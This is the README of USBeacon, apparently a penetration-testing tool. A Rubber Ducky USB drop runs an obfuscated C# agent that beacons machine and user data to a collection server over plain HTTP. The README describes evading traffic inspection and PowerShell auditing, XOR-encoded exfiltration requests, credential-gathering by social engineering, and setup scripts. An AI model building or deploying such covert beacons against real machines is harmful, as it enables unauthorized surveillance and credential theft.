USBeacon
===================
>- What and Why
>  - **Backend**
>  - **Frontend**
>  - **Provisioning**
>  - **Operations**
>  

#What and Why

* Ask: Use no exploitation or drop offensive agents (Empire, MSF), but record who inserted USB an on what machine. Possibly use SocEng opportunities to gain some credential data. 
* Enable transparent, obscured payload communication over common non-secured port (80). Application level encryption. This is done so that SSL interception and inspection is not an issue.  Works by blending into normal traffic. All it should look like a straight HTTP traffic.
* Allows storage of gathered data.
* Any HTTP client can communicate.

##Backend 

> - Flexibly Handles REST API
> Verbs:  _GET_, _POST_, _PUT_ 
> endpoints 
>  - /beacon/[:id] , 
>  - /ebeacon/[:id] (encrypted beacon) 
> - Decodes/decrypts payloads
> - Saves timestamped payloads to database 


Sample Plaintext (POST):

`POST http://example.com:8000/beacon/4445534B544F502D4A4D4A4D4E4C49`

`a=hid&d=state_ok_data_follows`

Sample Encrypted Request:

`POST http://example.com:8000/ebeacon/4445534B544F502D4A4D4A4D4E4C49 `

`a=hid&d=NTgsNTksNDUsNTMsNDIsNDksNDYsODMsNTIsNTEsNTIsNTEsNDgsNTAsNTUsMzQsMjYsMjMsMTksMzEsMTMsMzIsNTgsNTksNDUsNTMsNDIsNDksNDYsODMsNTIsNTEsNTIsNTEsNDgsNTAsNTUsMzIsNzksNzEsNzYsODAsNzksNzIsNzAsODAsNzksNzEsNzEsODAsNzksNzYsNzEsMzI`

### Install
git clone https://github.com/dsnezhkov/USBeacon.git

_Install runtime and framework dependencies_

    apt-get install python3.4-venv
    python3.4 -m venv venv
    pip install --upgrade  pip
    pip install gunicorn
    
_Install application dependencies_

    pip install -r requirements
    
  _Application init and start_
  
    python init_db.py
    
>Setup application container: Nginx/apache/wsgi, etc.
	    
    
    gunicorn app:app -p gunicorn.pid -b 0.0.0.0:8000  --error-logfile=gunicorn.log --access-logfile=gunicorn.log --capture-output  -D 

###_Alternatively run setup and run scripts_
`backend/scripts/setup.sh`
This script will also have a sample nginx site configuration

`backend/scripts/start_server.sh`

----------
## Frontend 

Really, it's about agent gathering the data. Normally it would be an executable on USB doing the collection. I opted to avoid Powershell or other native scripting capability to avoid the upcoming Powershell command auditing. This might include anything within **System.Management.Automation** space. At the same time C# agent strikes a balance between Powershell and unmanaged code. 

_Frontend_ contains example of such C# projects which collects needed info and can be used to communicate HTTP back to  the Backend collector.

>./frontend/Windows/exebeacon/

is one such example. 
For the specific need I have chosen to further protect the  code with https://yck1509.github.io/ConfuserEx/ 


Create others as needed.

## Provisioning 

Contains sample scripts to manage creation of a working USB RubberDucky drop.  

> ./dist - _your payloads that go on RD USB _ 
Scripts:
> - get_ext_deps.sh  - _Get USB RD dependency scripts_
> - gen_vidpid.sh - _VIP PID swapper
> - payload2usb.sh - _Flash RD firmware and copy payload to RD_
> - gen_inject.sh - Convert RD script to inject.bin 

## Operations
TBD
**Shortcomings:**

> - Static XOR key between frontend and backend, but can be randomized with keyspace of UTF-16  
Opted out of full symmetric encryption due to poor support in VBScript.